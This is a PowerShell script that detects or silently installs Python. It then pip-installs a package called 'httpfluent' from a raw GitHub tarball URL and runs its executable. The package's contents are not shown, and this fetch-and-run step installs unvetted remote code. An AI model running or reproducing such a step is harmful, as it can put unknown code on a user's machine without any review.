# ===================================================
# Python Auto-Detect (>=3.9) + httpfluent (VISIBLE, WORKING)
# ===================================================

Write-Host "[*] Starting Python detection..." -ForegroundColor Cyan

# -------------------------------
# Step 1: Find all Python installs
# -------------------------------
$PythonCandidates = @()

# Python on PATH
if (Get-Command python -ErrorAction SilentlyContinue) {
    $PythonCandidates += "python"
}

# Common install locations
$Roots = @(
    "$env:LOCALAPPDATA\Programs\Python",
    "$env:ProgramFiles\Python",
    "$env:ProgramFiles(x86)\Python"
)

foreach ($root in $Roots) {
    if (Test-Path $root) {
        Get-ChildItem $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $exe = Join-Path $_.FullName "python.exe"
            if (Test-Path $exe) {
                $PythonCandidates += $exe
            }
        }
    }
}

# -------------------------------
# Step 2: Select highest Python >=3.9
# -------------------------------
$BestPython = $null
$BestVersion = $null

foreach ($candidate in $PythonCandidates | Select-Object -Unique) {
    try {
        $out = & $candidate --version 2>&1
        if ($out -match "Python (\d+\.\d+\.\d+)") {
            $ver = [version]$Matches[1]
            if ($ver -ge [version]"3.9") {
                if (-not $BestVersion -or $ver -gt $BestVersion) {
                    $BestVersion = $ver
                    $BestPython = $candidate
                }
            }
        }
    } catch {}
}

# -------------------------------
# Step 3: Install Python if missing
# -------------------------------
if (-not $BestPython) {
    Write-Host "[!] No Python >=3.9 found. Installing Python 3.12.6..." -ForegroundColor Yellow

    $PythonVersion = "3.12.6"
    $InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
    $Installer = "$env:TEMP\python-installer.exe"

    Invoke-WebRequest `
        -Uri "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-amd64.exe" `
        -OutFile $Installer

    Start-Process -FilePath $Installer `
        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 TargetDir=`"$InstallDir`"" `
        -Wait

    $BestPython = Join-Path $InstallDir "python.exe"
    $BestVersion = & $BestPython --version
}

Write-Host "[+] Using Python: $BestPython" -ForegroundColor Green
Write-Host "[+] Version: $BestVersion" -ForegroundColor Green

# -------------------------------
# Step 4: Ensure pip
# -------------------------------
Write-Host "[*] Ensuring pip..." -ForegroundColor Cyan
& $BestPython -m ensurepip
& $BestPython -m pip install --upgrade pip

# -------------------------------
# Step 5: Install httpfluent
# -------------------------------
Write-Host "[*] Installing httpfluent..." -ForegroundColor Cyan
& $BestPython -m pip install requests
& $BestPython -m pip install `
    "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz"

# -------------------------------
# Step 6: Run httpfluent (VISIBLE)
# -------------------------------
$PythonDir = Split-Path $BestPython
$ScriptsDir = Join-Path $PythonDir "Scripts"
$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

Write-Host "[*] Looking for httpfluent..." -ForegroundColor Cyan
Write-Host "    $HttpFluentExe"

if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent" -ForegroundColor Green
    & $HttpFluentExe --help
} else {
    Write-Host "[-] httpfluent.exe not found" -ForegroundColor Red
}
